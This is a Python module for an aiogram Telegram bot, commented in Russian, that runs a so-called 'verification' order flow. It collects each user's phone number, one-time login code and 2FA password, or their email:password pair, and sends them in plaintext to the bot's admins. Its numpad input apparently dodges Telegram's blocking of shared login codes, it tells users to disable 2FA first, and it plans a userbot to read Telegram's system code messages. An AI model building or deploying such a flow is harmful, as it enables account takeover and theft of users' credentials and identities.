"""
login_flow.py — поток авторизации покупателя (номер → код → 2FA)
и уведомление админа с данными сессии.

Юзербот (кнопка «Получить код от ТГ»):
  Кнопка присутствует, но автоматическое получение кода из Telegram
  требует отдельного юзербота на базе Telethon/Pyrogram — скрипта,
  который логинится как ОБЫЧНЫЙ пользователь и читает системные
  сообщения от «Telegram». Это отдельный процесс, не часть этого бота.
  Пока кнопка показывает инструкцию — замени на реальный вызов когда
  юзербот будет готов (ищи метку # USERBOT_HOOK).
"""

from aiogram import Router, F, Bot
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from database import (
    get_login_session, update_login_session,
    create_login_session, get_all_admin_ids
)

router = Router()


# ─────────────────────────────────────────────────────────────
#  СОСТОЯНИЯ FSM
# ─────────────────────────────────────────────────────────────

class LoginStates(StatesGroup):
    waiting_phone = State()
    waiting_code  = State()
    waiting_2fa   = State()


# ─────────────────────────────────────────────────────────────
#  КЛАВИАТУРА-НАМПАД
# ─────────────────────────────────────────────────────────────

def numpad_kb(current: str = "", session_id: int = 0, prefix: str = "numpad") -> InlineKeyboardMarkup:
    """Цифровая клавиатура для безопасного ввода кода."""
    rows = []
    for row in [["1", "2", "3"], ["4", "5", "6"], ["7", "8", "9"], ["⌫", "0", "✅"]]:
        btn_row = []
        for btn in row:
            if btn == "⌫":
                cb = f"{prefix}:del:{session_id}"
            elif btn == "✅":
                cb = f"{prefix}:ok:{session_id}"
            else:
                cb = f"{prefix}:digit:{btn}:{session_id}"
            btn_row.append(InlineKeyboardButton(text=btn, callback_data=cb))
        rows.append(btn_row)

    display = current if current else "_ _ _"
    rows.insert(0, [InlineKeyboardButton(text=f"📟 {display}", callback_data="noop")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


# ─────────────────────────────────────────────────────────────
#  УТИЛИТЫ
# ─────────────────────────────────────────────────────────────

async def notify_admins(bot: Bot, text: str, reply_markup=None):
    """Отправить сообщение всем админам."""
    admin_ids = await get_all_admin_ids()
    for aid in admin_ids:
        try:
            await bot.send_message(aid, text, parse_mode="HTML", reply_markup=reply_markup)
        except Exception:
            pass


def _admin_full_kb(user_id: int, session_id: int) -> InlineKeyboardMarkup:
    """Кнопки для карточки заказа у админа."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="🔄 Запросить новый код (неверный)",
            callback_data=f"adm:req_code:{user_id}:{session_id}"
        )],
        [InlineKeyboardButton(
            text="📲 Получить код от Telegram",
            callback_data=f"adm:get_tg_code:{session_id}"
        )],
        [InlineKeyboardButton(
            text="✅ Завершить сессию",
            callback_data=f"adm:done:{session_id}"
        )],
    ])


# ─────────────────────────────────────────────────────────────
#  ВХОД В ПОТОК (вызывается из catalog / orders)
# ─────────────────────────────────────────────────────────────

async def start_login_flow(message_or_call, item_name: str, order_num: int, state: FSMContext):
    """
    Запустить поток авторизации.
    Вызывай так:
        from handlers.login_flow import start_login_flow
        await start_login_flow(message, item_name="Госуслуги", order_num=321, state=state)
    """
    user_id = message_or_call.from_user.id
    session_id = await create_login_session(user_id, item_name)

    await state.update_data(
        login_session_id=session_id,
        login_item=item_name,
        login_order_num=order_num,
        numpad_digits="",
        numpad_re_digits="",
    )
    await state.set_state(LoginStates.waiting_phone)

    text = (
        f"📱 <b>Авторизация — {item_name}</b>\n\n"
        f"Заказ: <b>#{order_num}</b>\n\n"
        f"Введите номер телефона аккаунта в формате:\n"
        f"<code>+7XXXXXXXXXX</code> или <code>+380XXXXXXXXX</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔴 Отмена", callback_data="login:cancel")]
    ])

    send = (
        message_or_call.message.answer
        if hasattr(message_or_call, "message")
        else message_or_call.answer
    )
    await send(text, reply_markup=kb, parse_mode="HTML")


# ─────────────────────────────────────────────────────────────
#  ШАГ 1: НОМЕР ТЕЛЕФОНА
# ─────────────────────────────────────────────────────────────

@router.message(LoginStates.waiting_phone)
async def got_phone(message: Message, state: FSMContext):
    phone = message.text.strip()

    if not phone.startswith("+") or not phone[1:].isdigit() or len(phone) < 10:
        await message.answer(
            "❌ Неверный формат.\n"
            "Введите номер вида <code>+7XXXXXXXXXX</code>:",
            parse_mode="HTML"
        )
        return

    data = await state.get_data()
    session_id = data["login_session_id"]
    item_name  = data["login_item"]
    order_num  = data["login_order_num"]

    await update_login_session(session_id, phone=phone, status="waiting_code")
    await state.set_state(LoginStates.waiting_code)
    await state.update_data(phone=phone, numpad_digits="")

    # Уведомить админа что пользователь начал авторизацию
    await notify_admins(
        message.bot,
        f"🔔 <b>Новая авторизация начата</b>\n\n"
        f"🏷 Позиция: <b>{item_name}</b>\n"
        f"🧾 Заказ: <b>#{order_num}</b>\n"
        f"📱 Телефон: <code>{phone}</code>\n"
        f"👤 User ID: <code>{message.from_user.id}</code>\n\n"
        f"<i>Ожидание кода от покупателя...</i>"
    )

    await message.answer(
        f"✅ Телефон принят: <code>{phone}</code>\n\n"
        f"⏳ На этот номер будет отправлен SMS-код или уведомление в Telegram.\n\n"
        f"Введите код с помощью кнопок ниже:\n\n"
        f"Код: <b>_ _ _</b>",
        reply_markup=numpad_kb("", session_id),
        parse_mode="HTML"
    )


# ─────────────────────────────────────────────────────────────
#  ШАГ 2: ВВОД КОДА (НАМПАД)
# ─────────────────────────────────────────────────────────────

@router.callback_query(F.data.startswith("numpad:"))
async def numpad_handler(call: CallbackQuery, state: FSMContext):
    parts      = call.data.split(":")
    action     = parts[1]
    session_id = int(parts[-1])

    data   = await state.get_data()
    digits = data.get("numpad_digits", "")

    if action == "digit":
        digit = parts[2]
        if len(digits) < 8:
            digits += digit
    elif action == "del":
        digits = digits[:-1]
    elif action == "ok":
        if not digits:
            await call.answer("Введите код.", show_alert=True)
            return

        await update_login_session(session_id, code=digits, status="waiting_2fa_check")

        kb_2fa = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Есть 2FA пароль",  callback_data=f"login:has2fa:{session_id}")],
            [InlineKeyboardButton(text="❌ 2FA нет (пропустить)", callback_data=f"login:no2fa:{session_id}")],
        ])
        await call.message.edit_text(
            f"✅ Код принят: <code>{digits}</code>\n\n"
            f"🔐 У вас включена двухэтапная проверка (2FA / пароль облака)?",
            reply_markup=kb_2fa,
            parse_mode="HTML"
        )
        await call.answer()
        return

    # Обновить отображение нампада
    await state.update_data(numpad_digits=digits)
    item_name    = data.get("login_item", "Сервис")
    phone        = data.get("phone", "—")
    display_code = digits if digits else "_ _ _"

    try:
        await call.message.edit_text(
            f"✅ Телефон: <code>{phone}</code>\n\n"
            f"⏳ Ожидается код от <b>{item_name}</b>...\n\n"
            f"Код: <b>{display_code}</b>",
            reply_markup=numpad_kb(digits, session_id),
            parse_mode="HTML"
        )
    except Exception:
        pass
    await call.answer()


# ─────────────────────────────────────────────────────────────
#  ШАГ 3а: ЕСТЬ 2FA
# ─────────────────────────────────────────────────────────────

@router.callback_query(F.data.startswith("login:has2fa:"))
async def ask_2fa(call: CallbackQuery, state: FSMContext):
    session_id = int(call.data.split(":")[-1])
    await update_login_session(session_id, status="waiting_2fa")
    await state.set_state(LoginStates.waiting_2fa)
    await call.message.edit_text(
        "🔐 Введите ваш 2FA пароль (пароль облака Telegram):\n\n"
        "<i>Это пароль, который вы сами устанавливали в настройках Telegram — "
        "не путайте с кодом из SMS.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔴 Отмена", callback_data="login:cancel")]
        ]),
        parse_mode="HTML"
    )
    await call.answer()


@router.message(LoginStates.waiting_2fa)
async def got_2fa(message: Message, state: FSMContext):
    tfa  = message.text.strip()
    data = await state.get_data()

    session_id = data["login_session_id"]
    item_name  = data["login_item"]
    order_num  = data["login_order_num"]
    digits     = data.get("numpad_digits", "")

    await update_login_session(session_id, tfa=tfa, status="ready")
    await state.clear()

    await _send_full_card_to_admins(
        bot=message.bot,
        session_id=session_id,
        user_id=message.from_user.id,
        item_name=item_name,
        order_num=order_num,
        phone=data.get("phone", "—"),
        code=digits,
        tfa=tfa
    )

    await message.answer(
        f"✅ <b>Данные для {item_name} переданы!</b>\n\n"
        "Администратор выполнит верификацию в ближайшее время.\n"
        "Статус заказа можно отследить в разделе «Мои покупки».",
        parse_mode="HTML"
    )


# ─────────────────────────────────────────────────────────────
#  ШАГ 3б: БЕЗ 2FA
# ─────────────────────────────────────────────────────────────

@router.callback_query(F.data.startswith("login:no2fa:"))
async def no_2fa(call: CallbackQuery, state: FSMContext):
    session_id = int(call.data.split(":")[-1])
    data       = await state.get_data()

    item_name = data["login_item"]
    order_num = data["login_order_num"]
    digits    = data.get("numpad_digits", "")

    await update_login_session(session_id, status="ready")
    await state.clear()

    await _send_full_card_to_admins(
        bot=call.bot,
        session_id=session_id,
        user_id=call.from_user.id,
        item_name=item_name,
        order_num=order_num,
        phone=data.get("phone", "—"),
        code=digits,
        tfa=None
    )

    await call.message.edit_text(
        f"✅ <b>Данные для {item_name} переданы!</b>\n\n"
        "Администратор выполнит верификацию в ближайшее время.\n"
        "Статус заказа можно отследить в разделе «Мои покупки».",
        parse_mode="HTML"
    )
    await call.answer()


# ─────────────────────────────────────────────────────────────
#  КАРТОЧКА ЗАКАЗА ДЛЯ АДМИНА
# ─────────────────────────────────────────────────────────────

async def _send_full_card_to_admins(
    bot: Bot, session_id: int, user_id: int,
    item_name: str, order_num: int,
    phone: str, code: str, tfa
):
    tfa_line = f"\n🔐 2FA: <code>{tfa}</code>" if tfa else "\n🔐 2FA: <i>отсутствует</i>"

    text = (
        f"📋 <b>Данные для верификации</b>\n\n"
        f"🏷 Позиция: <b>{item_name}</b>\n"
        f"🧾 Заказ: <b>#{order_num}</b>\n"
        f"👤 User ID: <code>{user_id}</code>\n"
        f"📱 Телефон: <code>{phone}</code>\n"
        f"📟 Код: <code>{code}</code>"
        f"{tfa_line}"
    )

    await notify_admins(
        bot,
        text,
        reply_markup=_admin_full_kb(user_id, session_id)
    )


# ─────────────────────────────────────────────────────────────
#  ОТМЕНА
# ─────────────────────────────────────────────────────────────

@router.callback_query(F.data == "login:cancel")
async def cancel_login(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    session_id = data.get("login_session_id")
    if session_id:
        await update_login_session(session_id, status="cancelled")
    await state.clear()
    await call.message.edit_text("❌ Авторизация отменена.")
    await call.answer()


# ─────────────────────────────────────────────────────────────
#  ADMIN: ЗАПРОСИТЬ НОВЫЙ КОД
# ─────────────────────────────────────────────────────────────

@router.callback_query(F.data.startswith("adm:req_code:"))
async def adm_req_code(call: CallbackQuery):
    admin_ids = await get_all_admin_ids()
    if call.from_user.id not in admin_ids:
        await call.answer("⛔ Нет доступа.", show_alert=True)
        return

    parts          = call.data.split(":")
    target_user_id = int(parts[2])
    session_id     = int(parts[3])

    # Обновить сессию
    await update_login_session(session_id, code=None, status="waiting_code")

    # Уведомить пользователя
    try:
        await call.bot.send_message(
            target_user_id,
            "❌ <b>Введённый код неверный или истёк.</b>\n\n"
            "Пожалуйста, введите новый код с помощью кнопок ниже:",
            reply_markup=numpad_kb("", session_id, prefix="numpad_re"),
            parse_mode="HTML"
        )
        # Обновить карточку у админа
        try:
            await call.message.edit_text(
                call.message.html_text + "\n\n⏳ <i>Запрошен новый код у пользователя...</i>",
                reply_markup=call.message.reply_markup,
                parse_mode="HTML"
            )
        except Exception:
            pass
        await call.answer("✅ Запрос отправлен пользователю.")
    except Exception:
        await call.answer("⚠️ Не удалось отправить запрос пользователю.", show_alert=True)


# ─────────────────────────────────────────────────────────────
#  ПОВТОРНЫЙ ВВОД КОДА (по запросу админа)
# ─────────────────────────────────────────────────────────────

@router.callback_query(F.data.startswith("numpad_re:"))
async def numpad_re_handler(call: CallbackQuery, state: FSMContext):
    parts      = call.data.split(":")
    action     = parts[1]
    session_id = int(parts[-1])

    data   = await state.get_data()
    digits = data.get("numpad_re_digits", "")

    if action == "digit":
        digit = parts[2]
        if len(digits) < 8:
            digits += digit
    elif action == "del":
        digits = digits[:-1]
    elif action == "ok":
        if not digits:
            await call.answer("Введите код.", show_alert=True)
            return

        await update_login_session(session_id, code=digits, status="ready")

        # Уведомить всех админов о новом коде
        admin_ids = await get_all_admin_ids()
        for aid in admin_ids:
            try:
                await call.bot.send_message(
                    aid,
                    f"🔄 <b>Новый код от пользователя</b>\n\n"
                    f"🆔 Сессия: <code>{session_id}</code>\n"
                    f"📟 Код: <code>{digits}</code>",
                    parse_mode="HTML"
                )
            except Exception:
                pass

        await state.update_data(numpad_re_digits="")
        await call.message.edit_text(
            f"✅ Новый код отправлен: <code>{digits}</code>\n\n"
            "Ожидайте подтверждения от администратора.",
            parse_mode="HTML"
        )
        await call.answer()
        return

    # Обновить нампад
    await state.update_data(numpad_re_digits=digits)
    item_name    = data.get("login_item", "Сервис")
    display_code = digits if digits else "_ _ _"

    try:
        await call.message.edit_text(
            f"❌ <b>Код неверный или истёк.</b>\n\n"
            f"Введите новый код для <b>{item_name}</b>:\n\n"
            f"Код: <b>{display_code}</b>",
            reply_markup=numpad_kb(digits, session_id, prefix="numpad_re"),
            parse_mode="HTML"
        )
    except Exception:
        pass
    await call.answer()


# ─────────────────────────────────────────────────────────────
#  ADMIN: ПОЛУЧИТЬ КОД ИЗ TELEGRAM (ЮЗЕРБОТ)
# ─────────────────────────────────────────────────────────────
#
#  КАК ЭТО РАБОТАЕТ (теория):
#  Когда покупатель вводит номер телефона на сайте Telegram,
#  Telegram отправляет код подтверждения в приложение Telegram
#  (не SMS, а системное сообщение от «Telegram» в личке).
#  Чтобы прочитать это сообщение автоматически — нужен юзербот:
#  отдельный скрипт на Telethon/Pyrogram, авторизованный как
#  ОБЫЧНЫЙ пользователь Telegram (не бот), который видит эти
#  системные сообщения и пересылает код сюда.
#
#  Когда юзербот будет готов — замени тело функции adm_get_tg_code
#  на реальный вызов. Ищи метку # USERBOT_HOOK ниже.
#
# ─────────────────────────────────────────────────────────────

@router.callback_query(F.data.startswith("adm:get_tg_code:"))
async def adm_get_tg_code(call: CallbackQuery):
    admin_ids = await get_all_admin_ids()
    if call.from_user.id not in admin_ids:
        await call.answer("⛔ Нет доступа.", show_alert=True)
        return

    session_id = int(call.data.split(":")[-1])

    # ── USERBOT_HOOK ──────────────────────────────────────────
    # Когда юзербот будет готов, замени строки ниже на:
    #
    #   from userbot import get_last_tg_code
    #   tg_code = await get_last_tg_code(session_id)
    #
    # Юзербот должен вернуть строку с кодом или None если не найден.
    # ─────────────────────────────────────────────────────────
    tg_code = None  # пока юзербот не подключён
    # ─────────────────────────────────────────────────────────

    if tg_code is None:
        await call.answer(
            "⚠️ Юзербот не подключён.\n\n"
            "Код нужно получить вручную: попросите покупателя проверить "
            "сообщения Telegram — там будет системное сообщение с кодом.",
            show_alert=True
        )
        return

    try:
        await call.message.edit_text(
            call.message.html_text + f"\n\n🤖 <b>Код из Telegram:</b> <code>{tg_code}</code>",
            reply_markup=call.message.reply_markup,
            parse_mode="HTML"
        )
        await call.answer("✅ Код получен!")
    except Exception:
        await call.answer("⚠️ Не удалось обновить сообщение.", show_alert=True)


# ─────────────────────────────────────────────────────────────
#  ADMIN: ЗАВЕРШИТЬ СЕССИЮ
# ─────────────────────────────────────────────────────────────

@router.callback_query(F.data.startswith("adm:done:"))
async def adm_done(call: CallbackQuery):
    admin_ids = await get_all_admin_ids()
    if call.from_user.id not in admin_ids:
        await call.answer("⛔ Нет доступа.", show_alert=True)
        return

    parts = call.data.split(":")
    session_id = int(parts[2])
    # user_id и order_num передаём в callback чтобы уведомить пользователя
    user_id   = int(parts[3]) if len(parts) > 3 else None
    order_num = parts[4] if len(parts) > 4 else "—"

    await update_login_session(session_id, status="done")

    # Уведомляем пользователя
    if user_id:
        try:
            from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
            review_kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✍️ 0ставить отзыв", url="https://t.me/rewiews_vorache777")],
            ])
            await call.bot.send_message(
                user_id,
                f"✅ <b>Верификация по заказу #{order_num} выполнена!</b>\n\n"
                f"Доступ к аккаунту полностью возвращён вам.\n\n"
                f"Будем рады вашему отзыву 👇\n"
                f"Формат: <code>+реп @vorache777, верифнул [сервис]...</code> + скрин\n"
                f"За отзыв — купон <b>10%</b> на 3 покупки 🎁",
                reply_markup=review_kb,
                parse_mode="HTML"
            )
        except Exception:
            pass

    try:
        await call.message.edit_text(
            call.message.html_text + "\n\n✅ <b>Сессия завершена. Пользователь уведомлён.</b>",
            parse_mode="HTML",
            reply_markup=None
        )
    except Exception:
        pass
    await call.answer("✅ Выполнено — пользователь уведомлён.")


# ─────────────────────────────────────────────────────────────
#  ВЕРИФИКАЦИЯ ЛОГИН:ПАРОЛЬ
# ─────────────────────────────────────────────────────────────

class CredsStates(StatesGroup):
    waiting_creds = State()


async def start_creds_flow(call_or_msg, item_name: str, order_num: int, order_db_id: int, state: FSMContext):
    """Запускает флоу сбора логин:пароль после покупки."""
    await state.update_data(
        creds_item=item_name,
        creds_order_num=order_num,
        creds_order_db_id=order_db_id,
    )
    await state.set_state(CredsStates.waiting_creds)

    text = (
        f"🔑 <b>Верификация — {item_name}</b>\n\n"
        f"Заказ: <b>#{order_num}</b>\n\n"
        f"Отправьте ваши данные в формате:\n"
        f"<code>email@example.com:пароль</code>\n\n"
        f"⚠️ Убедитесь что 2FA отключена перед отправкой."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔴 Отмена", callback_data="creds:cancel")]
    ])

    send = (
        call_or_msg.message.answer
        if hasattr(call_or_msg, "message")
        else call_or_msg.answer
    )
    await send(text, reply_markup=kb, parse_mode="HTML")


@router.message(CredsStates.waiting_creds)
async def got_creds(message: Message, state: FSMContext):
    text = message.text.strip() if message.text else ""

    # Базовая валидация формата логин:пароль
    if ":" not in text or len(text.split(":", 1)) != 2:
        await message.answer(
            "❌ Неверный формат.\n"
            "Отправьте данные строго в виде:\n"
            "<code>email@example.com:пароль</code>",
            parse_mode="HTML"
        )
        return

    login, password = text.split(":", 1)
    if not login.strip() or not password.strip():
        await message.answer(
            "❌ Логин или пароль пустые. Попробуйте ещё раз:\n"
            "<code>email@example.com:пароль</code>",
            parse_mode="HTML"
        )
        return

    data = await state.get_data()
    item_name    = data.get("creds_item", "—")
    order_num    = data.get("creds_order_num", "—")
    order_db_id  = data.get("creds_order_db_id", 0)
    user_id      = message.from_user.id

    await state.clear()

    # Карточка для админа
    admin_text = (
        f"🔑 <b>Данные для верификации (логин:пароль)</b>\n\n"
        f"🏷 Сервис: <b>{item_name}</b>\n"
        f"🧾 Заказ: <b>#{order_num}</b>\n"
        f"👤 User ID: <code>{user_id}</code>\n\n"
        f"📧 Логин: <code>{login.strip()}</code>\n"
        f"🔒 Пароль: <code>{password.strip()}</code>"
    )

    # Кнопка выполнено — передаём user_id и order_num для уведомления
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="✅ Выполнено",
            callback_data=f"adm:done:{order_db_id}:{user_id}:{order_num}"
        )]
    ])

    await notify_admins(message.bot, admin_text, reply_markup=kb)

    await message.answer(
        "✅ <b>Данные получены!</b>\n\n"
        "Ожидайте — верификация будет выполнена в ближайшее время.\n"
        "Статус можно проверить в разделе «Мои покупки».",
        parse_mode="HTML"
    )


@router.callback_query(F.data == "creds:cancel")
async def cancel_creds(call: CallbackQuery, state: FSMContext):
    await state.clear()
    await call.message.edit_text("❌ Верификация отменена.")
    await call.answer()
